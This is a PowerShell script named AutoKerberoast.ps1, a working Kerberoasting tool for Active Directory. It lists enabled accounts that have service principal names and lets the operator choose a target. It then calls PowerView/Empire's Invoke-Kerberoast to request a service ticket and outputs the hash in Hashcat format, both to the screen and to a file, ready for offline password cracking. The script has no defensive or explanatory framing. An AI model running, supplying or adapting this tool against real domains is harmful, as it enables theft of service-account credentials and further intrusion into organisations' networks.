# AutoKerberoast.ps1
# Purpose: Enumerate SPN accounts and perform Kerberoasting

#region Core Functions
function Get-SPNUsers {
    try {
        Get-ADUser -Filter "ServicePrincipalName -like '*'" `
            -Properties ServicePrincipalName, DistinguishedName, Enabled |
        Where-Object {$_.Enabled -eq $true} |
        Sort-Object -Property SamAccountName
    }
    catch {
        Write-Host "[!] SPN Enumeration Failed: $_" -ForegroundColor Red
        exit
    }
}

function Get-TGS {
    param(
        [Parameter(Mandatory=$true)]
        [string]$SamAccountName
    )

    try {
        # Use Invoke-Kerberoast from PowerView or Empire module
        $hashes = Invoke-Kerberoast -Identity $SamAccountName -OutputFormat Hashcat
        if ($hashes) {
            $hashes | Out-File "kerberoast_$SamAccountName.txt"
            return $hashes
        } else {
            Write-Host "[!] No hash returned." -ForegroundColor Yellow
            return $null
        }
    }
    catch {
        Write-Host "[!] Kerberoast failed: $_" -ForegroundColor Red
        return $null
    }
}


#Main
try {
    # Get SPN-enabled accounts
    $spnUsers = Get-SPNUsers
    
    if (-not $spnUsers) {
        Write-Host "[!] No SPN-enabled accounts found!" -ForegroundColor Yellow
        exit
    }

    # Display targets
    Write-Host "`n=== SPN-Enabled Accounts ===" -ForegroundColor Cyan
    $index = 0
    $spnUsers | ForEach-Object {
        Write-Host "[$index] $($_.SamAccountName)"
        Write-Host "   SPNs: $($_.ServicePrincipalName -join ', ')"
        $index++
    }

    # Get user selection
    $choice = Read-Host "`nSelect target (0-$($spnUsers.Count-1))"
    $target = $spnUsers[[int]$choice]

    # Get and display hash
    Write-Host "`n[+] Requesting TGS for $($target.SamAccountName)..." -ForegroundColor Cyan
    if ($hash = Get-TGS -SamAccountName $target.SamAccountName) {
        Write-Host "`n[+] Success! Hash:`n" -ForegroundColor Green
        $hash
        $hash | Out-File "kerberoast_$($target.SamAccountName).txt"
    }
}
catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
}
